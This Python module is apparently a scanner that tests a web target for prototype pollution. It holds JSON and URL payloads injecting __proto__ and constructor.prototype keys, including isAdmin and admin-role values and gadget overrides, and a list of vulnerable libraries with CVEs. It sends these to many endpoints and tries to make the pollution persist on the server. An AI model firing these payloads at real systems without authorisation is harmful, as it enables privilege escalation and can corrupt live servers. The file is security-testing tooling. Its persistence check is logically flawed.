"""Deep prototype pollution detection — query params, JSON body, merge functions, verification, gadget detection."""

import httpx
import json
import urllib.parse
import re
import asyncio

# --- Prototype Pollution Payloads ---
PP_PAYLOADS = [
    # Basic proto pollution
    ("proto_direct", {"__proto__": {"isAdmin": True}}, "Direct __proto__ injection"),
    ("proto_constructor", {"constructor": {"prototype": {"isAdmin": True}}}, "Constructor prototype chain"),
    ("proto_json_stringify", '{"__proto__":{"isAdmin":true}}', "JSON stringified __proto__"),
    ("proto_null_proto", {"__proto__": {"polluted": True}}, "__proto__ with null prototype"),

    # Deep merge targets
    ("deep_merge_a", {"a": {"__proto__": {"b": 1}}}, "Deep merge path injection"),
    ("deep_merge_nested", {"x": {"y": {"__proto__": {"z": True}}}}, "Nested deep merge"),

    # Constructor access
    ("constructor_proto", {"constructor": {"prototype": {"polluted": "yes"}}}, "Constructor prototype access"),
    ("constructor_fn", {"constructor": {"prototype": {"toString": "polluted"}}}, "Constructor toString override"),

    # Property pollution via array
    ("array_proto", [{"__proto__": {"polluted": True}}], "Array element proto pollution"),

    # toString/valueOf pollution
    ("toString_pollute", {"__proto__": {"toString": "polluted"}}, "toString override"),
    ("valueOf_pollute", {"__proto__": {"valueOf": "polluted"}}, "valueOf override"),

    # hasOwnProperty pollution
    ("hasown_pollute", {"__proto__": {"hasOwnProperty": "polluted"}}, "hasOwnProperty override"),
]

# --- URL Parameter Pollution ---
URL_PP_PAYLOADS = [
    ("qsp_proto", "__proto__[isAdmin]=true", "URL __proto__ parameter"),
    ("qsp_constructor", "constructor[prototype][isAdmin]=true", "URL constructor parameter"),
    ("qsp_proto_dot", "__proto__.isAdmin=true", "URL __proto__ dot notation"),
    ("qsp_constructor_dot", "constructor.prototype.isAdmin=true", "URL constructor dot notation"),
    ("qsp_bracket", "__proto__%5BisAdmin%5D=true", "URL encoded __proto__"),
    ("qsp_deep", "a[__proto__][isAdmin]=true", "URL nested __proto__"),
    ("qsp_polluted", "__proto__.polluted=yes", "URL simple pollution"),
]

# --- Verification Payloads ---
VERIFY_PAYLOADS = [
    ("verify_isAdmin", {"__proto__": {"isAdmin": True}}),
    ("verify_polluted", {"__proto__": {"polluted": "test_value"}}),
    ("verify_role", {"__proto__": {"role": "admin"}}),
    ("verify_id", {"__proto__": {"id": 999999}}),
]

# --- Known Vulnerable Libraries ---
VULNERABLE_LIBRARIES = [
    ("lodash", "lodash < 4.17.5", "_.merge, _.defaultsDeep", "CVE-2018-3721"),
    ("lodash_set", "lodash < 4.17.12", "_.set with __proto__", "CVE-2019-10744"),
    ("merge", "merge < 2.1.1", "merge()", "CVE-2018-16487"),
    ("deep_extend", "deep-extend < 0.5.1", "deepExtend()", "CVE-2018-16490"),
    ("hoek", "hoek < 5.0.3", "Hoek.merge, Hoek.applyToDefaults", "CVE-2018-3728"),
    ("extend", "extend < 3.0.2", "extend()", "CVE-2018-16492"),
    ("deepmerge", "deepmerge < 3.3.0", "deepmerge()", "Prototype pollution"),
    ("clone", "clone < 2.1.2", "clone()", "CVE-2018-16491"),
    ("express_fileupload", "express-fileupload < 1.1.6", "file upload parsing", "CVE-2019-10783"),
    ("qs", "qs < 6.3.2", "query string parsing", "Prototype pollution"),
    ("yargs-parser", "yargs-parser < 13.1.2", "argument parsing", "CVE-2020-7608"),
    ("minimist", "minimist < 1.2.6", "argument parsing", "Prototype pollution"),
    ("node.extend", "node.extend < 2.0.1", "extend()", "Prototype pollution"),
    ("underscore", "underscore (certain versions)", "_.extend", "Prototype pollution"),
]

# --- Gadget Detection ---
GADGET_PAYLOADS = [
    ("gadget_toString", {"__proto__": {"toString": "function(){return 'polluted'}"}}, "toString gadget"),
    ("gadget_toJSON", {"__proto__": {"toJSON": "function(){return 'polluted'}"}}, "toJSON gadget"),
    ("gadget_valueOf", {"__proto__": {"valueOf": "function(){return 1}"}}, "valueOf gadget"),
    ("gadget_isPrototypeOf", {"__proto__": {"isPrototypeOf": "function(){return true}"}}, "isPrototypeOf gadget"),
    ("gadget_hasOwnProperty", {"__proto__": {"hasOwnProperty": "function(){return true}"}}, "hasOwnProperty gadget"),
    ("gadget_propertyIsEnumerable", {"__proto__": {"propertyIsEnumerable": "function(){return true}"}}, "propertyIsEnumerable gadget"),
    ("gadget_defineProperty", {"__proto__": {"defineProperty": "function(){}"}}, "defineProperty gadget"),
    ("gadget_freeze", {"__proto__": {"freeze": "function(){}"}}, "freeze gadget"),
]

# --- HTTP Endpoints to Test ---
TEST_ENDPOINTS = [
    "", "/api", "/api/v1", "/api/v2", "/api/data",
    "/api/config", "/api/settings", "/api/user", "/api/admin",
    "/api/merge", "/api/update", "/api/save", "/api/patch",
    "/graphql", "/api/graphql",
]


def _check_pollution_evidence(response_text: str, injected_key: str) -> dict:
    """Check response for pollution evidence."""
    evidence = {
        "reflected": False,
        "key_visible": False,
        "admin_visible": False,
        "error_leak": False,
        "details": [],
    }

    if injected_key in response_text:
        evidence["reflected"] = True
        evidence["details"].append(f"Injected key reflected in response")

    if "isAdmin" in response_text and "true" in response_text:
        evidence["admin_visible"] = True
        evidence["details"].append("isAdmin=true visible in response")

    if "polluted" in response_text.lower():
        evidence["key_visible"] = True
        evidence["details"].append("Pollution key visible")

    if any(kw in response_text.lower() for kw in ["error", "exception", "stack", "trace"]):
        evidence["error_leak"] = True
        evidence["details"].append("Error information leaked")

    return evidence


async def prototype_pollution(target: str, param: str = "") -> dict:
    """Deep prototype pollution detection with verification, gadget detection, merge analysis."""
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    parsed = urllib.parse.urlparse(target)
    params = urllib.parse.parse_qs(parsed.query)
    base = f"{parsed.scheme}://{parsed.netloc}"

    test_params = [param] if param else list(params.keys()) if params else [
        "data", "json", "config", "settings", "options",
        "merge", "extend", "update", "body", "payload",
        "input", "params", "args", "props", "attributes",
    ]

    results = []
    pollution_evidence = []

    async with httpx.AsyncClient(timeout=15.0, verify=False, follow_redirects=False) as client:
        # --- Baseline ---
        try:
            baseline_resp = await client.get(target)
            baseline_body = baseline_resp.text
            baseline_status = baseline_resp.status_code
        except Exception:
            baseline_body = ""
            baseline_status = 200

        # --- URL Parameter Testing ---
        for p in test_params:
            for payload_name, payload_url, description in URL_PP_PAYLOADS:
                try:
                    url = f"{base}{parsed.path}?{payload_url}"
                    resp = await client.get(url)
                    body = resp.text

                    evidence = _check_pollution_evidence(body, "isAdmin")
                    if evidence["reflected"] or evidence["admin_visible"] or resp.status_code != baseline_status:
                        results.append({
                            "technique": "url_param_pollution",
                            "param": p,
                            "payload": payload_name,
                            "payload_value": payload_url,
                            "description": description,
                            "status": resp.status_code,
                            "evidence": evidence,
                            "risk": "CRITICAL" if evidence["admin_visible"] else "HIGH",
                            "confidence": "confirmed" if evidence["admin_visible"] else "probable",
                        })
                        pollution_evidence.append(evidence)
                        break
                except Exception:
                    continue

        # --- JSON Body Testing ---
        for p in test_params:
            for payload_name, payload_data, description in PP_PAYLOADS:
                try:
                    headers = {"Content-Type": "application/json"}
                    if isinstance(payload_data, dict):
                        body_data = json.dumps({p: payload_data})
                    else:
                        body_data = payload_data

                    resp = await client.post(target, content=body_data, headers=headers)
                    body = resp.text

                    evidence = _check_pollution_evidence(body, "isAdmin")
                    if evidence["reflected"] or evidence["admin_visible"] or resp.status_code != baseline_status:
                        results.append({
                            "technique": "json_body_pollution",
                            "param": p,
                            "payload": payload_name,
                            "description": description,
                            "status": resp.status_code,
                            "evidence": evidence,
                            "risk": "CRITICAL" if evidence["admin_visible"] else "HIGH",
                            "confidence": "confirmed" if evidence["admin_visible"] else "probable",
                        })
                        pollution_evidence.append(evidence)
                        break
                except Exception:
                    continue

        # --- Gadget Detection ---
        for payload_name, payload_data, description in GADGET_PAYLOADS:
            try:
                headers = {"Content-Type": "application/json"}
                for ep in TEST_ENDPOINTS[:5]:
                    try:
                        resp = await client.post(f"{base}{ep}", json=payload_data, headers=headers)
                        body = resp.text

                        if any(kw in body for kw in ["polluted", "function", "toString", "valueOf"]):
                            results.append({
                                "technique": "gadget_detection",
                                "endpoint": ep,
                                "payload": payload_name,
                                "description": description,
                                "evidence": body[:300],
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "confidence": "confirmed",
                            })
                            break
                    except Exception:
                        continue
                if any(r["technique"] == "gadget_detection" for r in results):
                    break
            except Exception:
                continue

        # --- Verification (try to confirm actual pollution) ---
        for payload_name, payload_data in VERIFY_PAYLOADS:
            try:
                headers = {"Content-Type": "application/json"}
                # Send pollution payload
                resp1 = await client.post(target, json=payload_data, headers=headers)
                # Send verification payload
                verify_payload = {"__proto__": {"verification_check": "polluted_test"}}
                resp2 = await client.post(target, json=verify_payload, headers=headers)

                if "polluted_test" in resp2.text:
                    results.append({
                        "technique": "pollution_verification",
                        "payload": payload_name,
                        "description": "Prototype pollution verified — property persisted across requests",
                        "status": resp2.status_code,
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                    })
                    break
            except Exception:
                continue

        # --- Library Detection ---
        detected_libraries = []
        try:
            main_resp = await client.get(target)
            body = main_resp.text.lower()

            for lib_name, vuln_range, function, cve in VULNERABLE_LIBRARIES:
                if lib_name in body:
                    detected_libraries.append({
                        "library": lib_name,
                        "vulnerable_range": vuln_range,
                        "function": function,
                        "cve": cve,
                    })
        except Exception:
            pass

    return {
        "target": target,
        "test_params": test_params,
        "results": results,
        "pollution_evidence": pollution_evidence,
        "detected_libraries": detected_libraries,
        "vulnerable": len(results) > 0,
        "total_findings": len(results),
        "techniques_found": list(set(r["technique"] for r in results)),
        "risk_summary": {
            "critical": sum(1 for r in results if r.get("risk") == "CRITICAL"),
            "high": sum(1 for r in results if r.get("risk") == "HIGH"),
            "medium": sum(1 for r in results if r.get("risk") == "MEDIUM"),
        },
    }
